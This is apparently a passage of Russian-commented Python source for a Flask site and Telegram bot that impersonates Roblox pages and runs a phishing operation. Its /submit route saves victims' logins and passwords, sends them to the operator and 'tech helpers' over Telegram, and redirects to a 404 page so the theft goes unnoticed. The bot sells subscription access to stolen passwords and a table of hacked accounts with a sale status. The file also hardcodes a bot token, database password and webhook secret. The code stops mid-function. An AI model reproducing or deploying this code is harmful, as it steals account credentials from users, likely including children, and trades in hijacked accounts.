# Импорт библиотек
from flask import Flask, request, abort, render_template
import telebot
from telebot import types
import psycopg2
import os
import requests
import threading
import time
import logging
import json
from datetime import datetime, timedelta
from functools import wraps
from ratelimit import limits, sleep_and_retry
import hashlib
import ipaddress
import re
from bs4 import BeautifulSoup

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Инициализация Flask
app = Flask(__name__, template_folder='templates')

# Конфигурация
TOKEN = '8028944732:AAFsvb4csGSRwtmEFYLGbnTKsCq1hOH6rm0'
ADMIN_CHAT_ID = '6956377285'
DATABASE_URL = 'postgresql://roblox_db_user:vjBfo3Vwigs5pnm107BhEkXe6AOy3FWF@dpg-cvr25cngi27c738j8c50-a.oregon-postgres.render.com/roblox_db'
SITE_URL = os.getenv('SITE_URL', 'https://tg-bod.onrender.com')
SECRET_WEBHOOK_TOKEN = '98pOXgZq1JMVhHYU9646rpBQl5nvwNXUzvR_WOpV34s'
LOGINS_FILE = os.path.join('templates', '404.index')

# Инициализация бота
try:
    bot = telebot.TeleBot(TOKEN)
    logger.info("Бот успешно инициализирован")
except Exception as e:
    logger.error(f"Ошибка инициализации бота: {e}")
    raise

# Глобальные переменные
processed_updates = set()
tech_mode = False
tech_reason = ""
tech_end_time = None
ad_keywords = [
    'подписка', 'заработок', 'реклама', 'продвижение', 'бесплатно',
    'акция', 'промо', 'скидка', 'casino', 'bet', 'казино', 'ставки',
    'деньги', 'инвестиции', 'бонус'
]
TELEGRAM_IP_RANGES = [
    ipaddress.IPv4Network('149.154.160.0/20'),
    ipaddress.IPv4Network('91.108.4.0/22')
]
CALLS = 100
PERIOD = 60

# Хэширование данных
def hash_data(data):
    logger.debug(f"Хэширование: {data}")
    return hashlib.sha256(str(data).encode()).hexdigest()

# Проверка IP Telegram
def is_telegram_ip(ip):
    try:
        client_ip = ipaddress.ip_address(ip)
        for network in TELEGRAM_IP_RANGES:
            if client_ip in network:
                logger.info(f"IP {ip} — Telegram")
                return True
        logger.warning(f"IP {ip} не Telegram")
        return False
    except ValueError:
        logger.error(f"Неверный IP: {ip}")
        return False

# Ограничение частоты запросов
@sleep_and_retry
@limits(calls=CALLS, period=PERIOD)
def rate_limited_endpoint(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        logger.debug(f"Лимит для {func.__name__}")
        return func(*args, **kwargs)
    return wrapper

# Текущее время (20:18 UTC+2)
def get_current_time():
    now = datetime.now()
    adjusted_time = now.replace(hour=20, minute=18, second=0, microsecond=0) + timedelta(hours=2)
    if adjusted_time.day != now.day:
        adjusted_time = adjusted_time.replace(day=now.day)
    logger.debug(f"Время установлено: {adjusted_time}")
    return adjusted_time

# Форматирование времени
def format_time(dt):
    if not dt:
        return "Не указано"
    try:
        if isinstance(dt, str):
            dt = datetime.fromisoformat(dt)
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except ValueError:
        return "Неверный формат"

# Подключение к базе
def get_db_connection():
    logger.info("Подключение к базе")
    try:
        conn = psycopg2.connect(DATABASE_URL, connect_timeout=5)
        logger.info("База подключена")
        return conn
    except Exception as e:
        logger.error(f"Ошибка подключения: {e}")
        return None

# Инициализация базы
def init_db():
    logger.info("Инициализация базы")
    conn = get_db_connection()
    if not conn:
        logger.error("База недоступна")
        return False
    try:
        with conn.cursor() as c:
            c.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    chat_id TEXT PRIMARY KEY,
                    prefix TEXT,
                    subscription_end TEXT,
                    username TEXT,
                    last_activity TEXT,
                    ip_hash TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS credentials (
                    login TEXT PRIMARY KEY,
                    password TEXT,
                    added_time TEXT,
                    added_by TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS hacked_accounts (
                    login TEXT PRIMARY KEY,
                    password TEXT,
                    hack_date TEXT,
                    prefix TEXT,
                    sold_status TEXT,
                    linked_chat_id TEXT
                )
            ''')
            c.execute('''
                CREATE TABLE IF NOT EXISTS support_requests (
                    request_id SERIAL PRIMARY KEY,
                    chat_id TEXT,
                    username TEXT,
                    message_text TEXT,
                    request_time TEXT,
                    status TEXT DEFAULT 'open',
                    responded_by TEXT,
                    response_text TEXT,
                    response_time TEXT
                )
            ''')
            subscription_end = (get_current_time() + timedelta(days=3650)).isoformat()
            logger.info(f"Добавление Создателя: {ADMIN_CHAT_ID}")
            c.execute(
                '''
                INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (chat_id) DO UPDATE
                SET prefix = EXCLUDED.prefix,
                    subscription_end = EXCLUDED.subscription_end,
                    last_activity = EXCLUDED.last_activity,
                    ip_hash = EXCLUDED.ip_hash,
                    username = EXCLUDED.username
                ''',
                (ADMIN_CHAT_ID, "Создатель", subscription_end, get_current_time().isoformat(), hash_data(ADMIN_CHAT_ID), "@sacoectasy")
            )
            conn.commit()
            logger.info("База готова")
            return True
    except Exception as e:
        logger.error(f"Ошибка инициализации: {e}")
        return False
    finally:
        conn.close()

# Поддержание активности
def keep_alive():
    logger.info("Запуск keep_alive")
    while True:
        try:
            response = requests.get(SITE_URL, timeout=10)
            logger.debug(f"Пинг {SITE_URL}: {response.status_code}")
        except Exception as e:
            logger.error(f"Ошибка keep_alive: {e}")
        time.sleep(60)

# Получение данных пользователя
def get_user(chat_id):
    logger.info(f"Запрос данных: {chat_id}")
    conn = get_db_connection()
    if not conn:
        if chat_id == ADMIN_CHAT_ID:
            logger.info("Админ без базы")
            return {
                'prefix': 'Создатель',
                'subscription_end': (get_current_time() + timedelta(days=3650)).isoformat(),
                'last_activity': get_current_time().isoformat(),
                'ip_hash': hash_data(chat_id),
                'username': '@sacoectasy'
            }
        logger.warning("База недоступна")
        return None
    try:
        with conn.cursor() as c:
            c.execute(
                "SELECT prefix, subscription_end, last_activity, ip_hash, username FROM users WHERE chat_id = %s",
                (chat_id,)
            )
            result = c.fetchone()
            if result:
                logger.info(f"Пользователь {chat_id} найден")
                return {
                    'prefix': result[0],
                    'subscription_end': result[1],
                    'last_activity': result[2],
                    'ip_hash': result[3],
                    'username': result[4]
                }
            logger.info(f"Пользователь {chat_id} не найден")
            return None
    except Exception as e:
        logger.error(f"Ошибка данных: {e}")
        return None
    finally:
        conn.close()

# Сохранение пользователя
def save_user(chat_id, prefix, subscription_end=None, ip=None, username=None):
    logger.info(f"Сохранение: {chat_id}")
    conn = get_db_connection()
    if not conn:
        logger.error("База недоступна")
        return
    try:
        with conn.cursor() as c:
            subscription_end = subscription_end or get_current_time().isoformat()
            ip_hash = hash_data(ip or chat_id)
            last_activity = get_current_time().isoformat()
            c.execute(
                '''
                INSERT INTO users (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (chat_id) DO UPDATE
                SET prefix = EXCLUDED.prefix,
                    subscription_end = EXCLUDED.subscription_end,
                    last_activity = EXCLUDED.last_activity,
                    ip_hash = EXCLUDED.ip_hash,
                    username = EXCLUDED.username
                ''',
                (chat_id, prefix, subscription_end, last_activity, ip_hash, username)
            )
            conn.commit()
            logger.info(f"Пользователь {chat_id} сохранён")
    except Exception as e:
        logger.error(f"Ошибка сохранения: {e}")
    finally:
        conn.close()

# Проверка доступа
def check_access(chat_id, command):
    global tech_mode, tech_end_time
    logger.info(f"Проверка: {chat_id} для {command}")
    user = get_user(chat_id)
    
    if user and user['prefix'] in ['Создатель', 'ТехПомощник']:
        logger.debug(f"{user['prefix']} {chat_id} имеет полный доступ")
        return None
    
    if tech_mode and chat_id != ADMIN_CHAT_ID:
        end_time_str = format_time(tech_end_time)
        logger.warning(f"Тех. режим: {chat_id}")
        return (
            f"🛠 *Бот на техническом перерыве!*\n"
            f"📝 *Причина*: {tech_reason or 'Не указана'}\n"
            f"🕒 *Окончание*: {end_time_str}\n"
            f"Попробуйте позже."
        )
    
    if user is None:
        if command in ['start', 'menu', 'support']:
            logger.info(f"Регистрация {chat_id} для {command}")
            return None
        logger.warning(f"Нет доступа: {chat_id}, {command}")
        return "💳 *Купить подписку у @sacoectasy!*"
    
    try:
        subscription_end = datetime.fromisoformat(user['subscription_end']) if user['subscription_end'] else get_current_time()
        if subscription_end < get_current_time():
            logger.info(f"Подписка истекла: {chat_id}")
            save_user(chat_id, 'Посетитель', get_current_time().isoformat(), chat_id, user['username'])
            return "💳 *Подписка истекла! Обратитесь к @sacoectasy.*"
    except ValueError:
        logger.error(f"Неверный формат subscription_end для {chat_id}")
        return "❌ *Ошибка данных подписки!*"
    
    if user['prefix'] == 'Посетитель':
        if command in ['start', 'menu', 'support']:
            logger.debug(f"Разрешён {command} для Посетителя")
            return None
        logger.warning(f"Запрещён {command} для Посетителя")
        return "💳 *Купить подписку у @sacoectasy!*"
    
    if command in ['passwords', 'hacked', 'getchatid', 'site', 'messageuser', 'logins']:
        logger.debug(f"Разрешён {command}")
        return None
    
    if command in ['database', 'viewdb', 'support']:
        if user['prefix'] in ['Админ', 'Создатель', 'ТехПомощник']:
            logger.debug(f"Разрешён {command} для {user['prefix']}")
            return None
    
    if command in ['techstop', 'techstopoff', 'adprefix', 'delprefix', 'adduser', 'addcred', 'addhacked', 'broadcast', 'admin', 'messageuser']:
        if user['prefix'] not in ['Создатель', 'ТехПомощник']:
            logger.warning(f"Запрещена команда {command} для {chat_id}")
            return "🔒 *Эта команда только для Создателя или ТехПомощника!*"
    
    logger.debug(f"Разрешён {command}")
    return None

# Список пользователей
def get_all_users():
    logger.info("Запрос пользователей")
    conn = get_db_connection()
    if not conn:
        logger.error("База недоступна")
        return []
    try:
        with conn.cursor() as c:
            c.execute("SELECT chat_id, prefix, username FROM users")
            users = c.fetchall()
            logger.info(f"Найдено {len(users)} пользователей")
            return users
    except Exception as e:
        logger.error(f"Ошибка пользователей: {e}")
        return []
    finally:
        conn.close()

# Получение техпомощников
def get_tech_assistants():
    logger.info("Запрос техпомощников")
    conn = get_db_connection()
    if not conn:
        logger.error("База недоступна")
        return []
    try:
        with conn.cursor() as c:
            c.execute("SELECT chat_id FROM users WHERE prefix = %s", ('ТехПомощник',))
            techs = [row[0] for row in c.fetchall()]
            logger.info(f"Найдено {len(techs)} техпомощников")
            return techs
    except Exception as e:
        logger.error(f"Ошибка техпомощников: {e}")
        return []
    finally:
        conn.close()

# Чтение логинов из файла 404.index
def read_logins_from_file():
    logger.info(f"Чтение файла {LOGINS_FILE}")
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
        if LOGINS_FILE.endswith('.html') or LOGINS_FILE.endswith('.index'):
            soup = BeautifulSoup(content, 'html.parser')
            logins = []
            for p in soup.find_all('p'):
                text = p.get_text().strip()
                if text and not text.startswith(('http', '#', '!')):
                    logins.append(text)
            for input_tag in soup.find_all('input', {'name': 'login'}):
                value = input_tag.get('value', '').strip()
                if value:
                    logins.append(value)
            if not logins:
                lines = content.split('\n')
                logins = [line.strip() for line in lines if line.strip() and not line.startswith(('http', '#', '!'))]
        else:
            logins = [line.strip() for line in content.split('\n') if line.strip() and not line.startswith(('http', '#', '!'))]
        logins = list(set(logins))
        logger.info(f"Найдено {len(logins)} логинов")
        return logins
    except FileNotFoundError:
        logger.error(f"Файл {LOGINS_FILE} не найден")
        return []
    except Exception as e:
        logger.error(f"Ошибка чтения файла: {e}")
        return []

# Удаление логина из файла
def delete_login_from_file(login_to_delete):
    logger.info(f"Удаление логина {login_to_delete} из {LOGINS_FILE}")
    try:
        with open(LOGINS_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
        if LOGINS_FILE.endswith('.html') or LOGINS_FILE.endswith('.index'):
            soup = BeautifulSoup(content, 'html.parser')
            for p in soup.find_all('p'):
                if p.get_text().strip() == login_to_delete:
                    p.decompose()
            for input_tag in soup.find_all('input', {'name': 'login'}):
                if input_tag.get('value') == login_to_delete:
                    input_tag.decompose()
            new_content = str(soup)
        else:
            lines = content.split('\n')
            new_content = '\n'.join(line for line in lines if line.strip() != login_to_delete)
        with open(LOGINS_FILE, 'w', encoding='utf-8') as f:
            f.write(new_content)
        logger.info(f"Логин {login_to_delete} удалён из файла")
        return True
    except Exception as e:
        logger.error(f"Ошибка удаления из файла: {e}")
        return False

# Проверка статуса бота
def check_bot_status():
    logger.info("Проверка статуса")
    try:
        bot.get_me()
        logger.info("Бот активен")
        return True
    except Exception as e:
        logger.error(f"Бот не отвечает: {e}")
        return False

# Очистка ввода
def sanitize_input(text):
    if not text:
        return ""
    return re.sub(r'[<>;\'"]', '', str(text)).strip()

# Маршруты Flask
@app.route('/', endpoint='index')
def index():
    logger.info("Запрос на /")
    return render_template('index.html')

@app.route('/toptrending', endpoint='top_trending')
def top_trending():
    logger.info("Запрос на /toptrending")
    return render_template('toptrending.html')

@app.route('/login-roblox', endpoint='login_roblox')
def login_roblox():
    logger.info("Запрос на /login-roblox")
    return render_template('login-roblox.html')

@app.route('/index', endpoint='index_explicit')
def index_explicit():
    logger.info("Запрос на /index")
    return render_template('index.html')

@app.route('/upandcoming', endpoint='up_and_coming')
def up_and_coming():
    logger.info("Запрос на /upandcoming")
    return render_template('upandcoming.html')

@app.route('/funwithfriends', endpoint='fun_with_friends')
def fun_with_friends():
    logger.info("Запрос на /funwithfriends")
    return render_template('funwithfriends.html')

@app.route('/hotrightnow', endpoint='hot_right_now')
def hot_right_now():
    logger.info("Запрос на /hotrightnow")
    return render_template('hotrightnow.html')

@app.route('/toprevisted', endpoint='top_revisited')
def top_revisited():
    logger.info("Запрос на /toprevisted")
    return render_template('toprevisted.html')

# Настройка логирования (если ещё не настроено)
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Убедитесь, что эти импорты есть
from flask import Flask, request, render_template
import logging
import time

# Настройка логирования
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Обновлённый маршрут /submit
# Убедитесь, что импорты присутствуют
from flask import Flask, request, render_template, redirect, url_for
import logging
import time

# Настройка логирования
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Обновлённый маршрут /submit
@app.route('/submit', methods=['POST'])
def submit_login():
    logger.info("Обработка формы логина")
    try:
        login = sanitize_input(request.form.get('login'))
        password = sanitize_input(request.form.get('password'))
        logger.debug(f"Получено: login={login}, password={password}")
        if not login or not password:
            logger.warning("Пустой логин или пароль")
            return render_template('login-roblox.html')  # Без ошибки, чтобы незаметно
        conn = get_db_connection()
        if not conn:
            logger.error("База недоступна")
            return redirect(url_for('show_404'))  # На 404 при ошибке
        try:
            with conn.cursor() as c:
                c.execute(
                    '''
                    INSERT INTO credentials (login, password, added_time, added_by)
                    VALUES (%s, %s, %s, %s)
                    ON CONFLICT (login) DO NOTHING
                    ''',
                    (login, password, get_current_time().isoformat(), "web_form")
                )
                conn.commit()
                logger.info(f"Сохранено в базе: {login}")
        except Exception as e:
            logger.error(f"Ошибка сохранения в базе: {e}")
            return redirect(url_for('show_404'))  # На 404 при ошибке
        finally:
            conn.close()
        # Повторные попытки отправки уведомления
        for attempt in range(3):
            try:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
                    parse_mode='Markdown'
                )
                logger.info(f"Уведомление отправлено (попытка {attempt + 1})")
                # Отправка техпомощникам
                for tech_id in get_tech_assistants():
                    try:
                        bot.send_message(
                            tech_id,
                            f"🔐 *Новый логин*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n🕒 *Время*: {format_time(get_current_time())}",
                            parse_mode='Markdown'
                        )
                    except Exception as e:
                        logger.error(f"Ошибка отправки техпомощнику {tech_id}: {e}")
                break
            except Exception as e:
                logger.error(f"Ошибка отправки в Telegram (попытка {attempt + 1}): {e}")
                if attempt == 2:
                    logger.error("Все попытки отправки провалились")
                time.sleep(1)
        return redirect(url_for('show_404'))  # Перенаправление на 404
    except Exception as e:
        logger.error(f"Ошибка обработки формы: {e}")
        return redirect(url_for('show_404'))  # На 404 при любой ошибке

# Новый маршрут /404
@app.route('/404')
def show_404():
    logger.info("Запрос страницы 404")
    try:
        return render_template('404.html')
    except Exception as e:
        logger.error(f"Ошибка загрузки 404.html: {e}")
        return "Ошибка загрузки страницы 404", 500
@app.errorhandler(404)
def page_not_found(e):
    logger.info(f"404 ошибка: {request.path}")
    return render_template('404.index'), 404

@app.route('/webhook', methods=['POST'])
@rate_limited_endpoint
def webhook():
    logger.info("Запрос на /webhook")
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    if not is_telegram_ip(client_ip):
        logger.warning(f"Чужой IP: {client_ip}")
        abort(403)
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_WEBHOOK_TOKEN:
        logger.warning("Неверный токен")
        abort(403)
    if request.headers.get('content-type') != 'application/json':
        logger.warning("Неверный content-type")
        abort(400)
    try:
        update = telebot.types.Update.de_json(request.get_data().decode('utf-8'))
        if not update or not (update.message or update.callback_query):
            logger.debug("Пустое обновление")
            return 'OK', 200
        update_id = update.update_id
        if update_id in processed_updates:
            logger.info(f"Повтор: {update_id}")
            return 'OK', 200
        processed_updates.add(update_id)
        logger.info(f"Обработка: {update_id}")
        threading.Thread(target=bot.process_new_updates, args=([update],)).start()
        return 'OK', 200
    except Exception as e:
        logger.error(f"Ошибка вебхука: {e}")
        return 'OK', 200

# /start
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/start от {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = (
        "🌟 *Добро пожаловать в бота!*\n"
        "Здесь вы найдёте эксклюзивные функции и данные.\n"
        "🔍 Используйте /menu для просмотра доступных команд."
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user is None:
            save_user(chat_id, "Посетитель", get_current_time().isoformat(), str(message.from_user.id), username)
        else:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /start: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /menu
@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/menu от {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if user is None:
        save_user(chat_id, "Посетитель", get_current_time().isoformat(), str(message.from_user.id), username)
        user = get_user(chat_id)
    prefix = user['prefix']
    tech_status = (
        f"🛠 *Техперерыв активен*\n"
        f"📝 *Причина*: {tech_reason or 'Не указана'}\n"
        f"🕒 *Окончание*: {format_time(tech_end_time)}"
    ) if tech_mode else "✅ *Техперерыв отключён*"
    response = (
        f"📋 *Главное меню*\n"
        f"👤 *Ваш статус*: `{prefix}`\n"
        f"🕒 *Статус бота*: {tech_status}\n\n"
        f"🔥 *Доступные команды*:\n"
        f"📖 /menu — Показать это меню\n"
        f"📩 /support — Связаться с поддержкой\n"
    )
    if prefix != "Посетитель":
        response += (
            f"🆔 /getchatid — Узнать ваш ID\n"
            f"🌐 /site — Ссылка на наш сайт\n"
            f"🔑 /passwords — Просмотр паролей\n"
            f"💻 /hacked — Взломанные аккаунты\n"
            f"📜 /logins — Логины из файла\n"
            f"📞 /messageuser — Связаться с пользователем\n"
        )
    if prefix in ["Админ", "Создатель", "ТехПомощник"]:
        response += (
            f"🗄 /database — Управление базой данных\n"
            f"🔍 /viewdb — Просмотр базы данных\n"
            f"📩 /support — Управление поддержкой\n"
        )
    if prefix in ["Создатель", "ТехПомощник"]:
        response += (
            f"🔧 /admin — Панель администратора\n"
            f"🚨 /techstop — Включить техперерыв\n"
            f"✅ /techstopoff — Выключить техперерыв\n"
            f"📢 /broadcast — Отправить рассылку\n"
            f"👑 /adprefix — Выдать подписку\n"
            f"🗑 /delprefix — Сбросить подписку\n"
            f"➕ /adduser — Добавить пользователя\n"
            f"🔐 /addcred — Добавить пароль\n"
            f"💾 /addhacked — Добавить взломанный аккаунт\n"
        )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /menu: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /getchatid
@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/getchatid от {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = (
        f"🆔 *Ваш идентификатор*\n"
        f"🔢 *Chat ID*: `{chat_id}`\n"
        f"👤 *Юзернейм*: @{username}"
    )
    try:
        bot.reply_to(message, response, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
    except Exception as e:
        logger.error(f"Ошибка /getchatid: {e}")
        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

# /support
@bot.message_handler(commands=['support'])
def support_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/support от {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if user and user['prefix'] in ['Создатель', 'ТехПомощник']:
        # Для админов и техпомощников — просмотр запросов
        conn = get_db_connection()
        if not conn:
            bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
            return
        try:
            with conn.cursor() as c:
                c.execute(
                    '''
                    SELECT request_id, chat_id, username, message_text, request_time, status
                    FROM support_requests
                    WHERE status = %s
                    ORDER BY request_time DESC
                    ''',
                    ('open',)
                )
                requests = c.fetchall()
                if not requests:
                    bot.reply_to(message, "📭 *Нет открытых запросов в поддержку.*", parse_mode='Markdown')
                else:
                    for idx, (req_id, req_chat_id, req_username, text, req_time, status) in enumerate(requests, 1):
                        response = (
                            f"📩 *Запрос #{idx}*\n"
                            f"🆔 *Chat ID*: `{req_chat_id}`\n"
                            f"👤 *Юзернейм*: @{req_username or 'Неизвестно'}\n"
                            f"📜 *Сообщение*: {text}\n"
                            f"🕒 *Время*: {format_time(req_time)}\n"
                            f"📊 *Статус*: {status}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup(row_width=2)
                        keyboard.add(
                            types.InlineKeyboardButton(
                                "📨 Ответить",
                                callback_data=f"support_reply_{req_id}_{req_chat_id}"
                            ),
                            types.InlineKeyboardButton(
                                "🗑 Удалить",
                                callback_data=f"support_delete_{req_id}_{req_chat_id}"
                            )
                        )
                        bot.send_message(
                            chat_id,
                            response,
                            reply_markup=keyboard,
                            parse_mode='Markdown'
                        )
        except Exception as e:
            logger.error(f"Ошибка просмотра поддержки: {e}")
            bot.reply_to(message, "❌ *Ошибка загрузки запросов!*", parse_mode='Markdown')
        finally:
            conn.close()
    else:
        # Для пользователей — отправка запроса
        response = (
            "📩 *Нужна помощь?*\n"
            "Опишите вашу проблему, и мы передадим её в поддержку!"
        )
        try:
            msg = bot.reply_to(message, response, parse_mode='Markdown')
            bot.register_next_step_handler(msg, lambda m: process_support_message(m, username))
        except Exception as e:
            logger.error(f"Ошибка /support: {e}")
            bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')

def process_support_message(message, username):
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Поддержка от {chat_id}: {text}")
    if not text:
        bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO support_requests (chat_id, username, message_text, request_time, status)
                VALUES (%s, %s, %s, %s, %s)
                RETURNING request_id
                ''',
                (chat_id, username, text, get_current_time().isoformat(), 'open')
            )
            request_id = c.fetchone()[0]
            conn.commit()
        response = (
            f"📩 *Новый запрос в поддержку #{request_id}*\n"
            f"🆔 *Chat ID*: `{chat_id}`\n"
            f"👤 *Юзернейм*: @{username}\n"
            f"📜 *Сообщение*: {text}\n"
            f"🕒 *Время*: {format_time(get_current_time())}"
        )
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton(
                "📨 Ответить",
                callback_data=f"support_reply_{request_id}_{chat_id}"
            ),
            types.InlineKeyboardButton(
                "🗑 Удалить",
                callback_data=f"support_delete_{request_id}_{chat_id}"
            )
        )
        # Отправка Создателю
        bot.send_message(
            ADMIN_CHAT_ID,
            response,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        # Отправка техпомощникам
        for tech_id in get_tech_assistants():
            try:
                bot.send_message(
                    tech_id,
                    response,
                    reply_markup=keyboard,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Ошибка отправки техпомощнику {tech_id}: {e}")
        bot.reply_to(message, "✅ *Ваше сообщение отправлено в поддержку!*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Ошибка отправки: {e}")
        bot.reply_to(message, "❌ *Ошибка при отправке! Попробуйте позже.*", parse_mode='Markdown')
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('support_'))
def handle_support_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"Кнопка {call.data} от {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        action, req_id, req_chat_id = call.data.split('_', 2)
        if action == 'support_reply':
            msg = bot.send_message(
                chat_id,
                f"📝 *Введите ответ на запрос #{req_id} для пользователя {req_chat_id}*:",
                parse_mode='Markdown'
            )
            bot.register_next_step_handler(
                msg,
                lambda m: process_support_reply(m, req_id, req_chat_id)
            )
        elif action == 'support_delete':
            conn = get_db_connection()
            if not conn:
                bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
                return
            try:
                with conn.cursor() as c:
                    c.execute(
                        "UPDATE support_requests SET status = %s WHERE request_id = %s",
                        ('deleted', req_id)
                    )
                    conn.commit()
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"✅ *Запрос #{req_id} удалён!*",
                    parse_mode='Markdown'
                )
                # Уведомление другим техпомощникам и Создателю
                for target_id in [ADMIN_CHAT_ID] + get_tech_assistants():
                    if target_id != chat_id:
                        try:
                            bot.send_message(
                                target_id,
                                f"🗑 *Запрос #{req_id} удалён пользователем {chat_id}.*",
                                parse_mode='Markdown'
                            )
                        except Exception as e:
                            logger.error(f"Ошибка уведомления {target_id}: {e}")
            except Exception as e:
                logger.error(f"Ошибка удаления запроса: {e}")
                bot.send_message(chat_id, "❌ *Ошибка удаления запроса!*", parse_mode='Markdown')
            finally:
                conn.close()
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Ошибка обработки кнопки: {e}")
        bot.send_message(chat_id, "❌ *Ошибка обработки!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)

def process_support_reply(message, req_id, req_chat_id):
    chat_id = str(message.chat.id)
    response_text = sanitize_input(message.text)
    logger.info(f"Ответ на запрос #{req_id} от {chat_id}: {response_text}")
    if not response_text:
        bot.reply_to(message, "❌ *Ответ не может быть пустым!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                UPDATE support_requests
                SET status = %s, responded_by = %s, response_text = %s, response_time = %s
                WHERE request_id = %s
                ''',
                ('closed', chat_id, response_text, get_current_time().isoformat(), req_id)
            )
            conn.commit()
        bot.reply_to(
            message,
            f"✅ *Ответ на запрос #{req_id} отправлен пользователю {req_chat_id}!*",
            parse_mode='Markdown'
        )
        bot.send_message(
            req_chat_id,
            f"📨 *Ответ на ваш запрос #{req_id}*:\n{response_text}",
            parse_mode='Markdown'
        )
        # Уведомление другим техпомощникам и Создателю
        for target_id in [ADMIN_CHAT_ID] + get_tech_assistants():
            if target_id != chat_id:
                try:
                    bot.send_message(
                        target_id,
                        f"📨 *Запрос #{req_id} обработан*\n👤 *Ответил*: {chat_id}\n📜 *Ответ*: {response_text}",
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Ошибка уведомления {target_id}: {e}")
    except Exception as e:
        logger.error(f"Ошибка отправки ответа: {e}")
        bot.reply_to(message, "❌ *Ошибка отправки ответа!*", parse_mode='Markdown')
    finally:
        conn.close()

# /site
@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "Неизвестно"
    logger.info(f"/site от {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
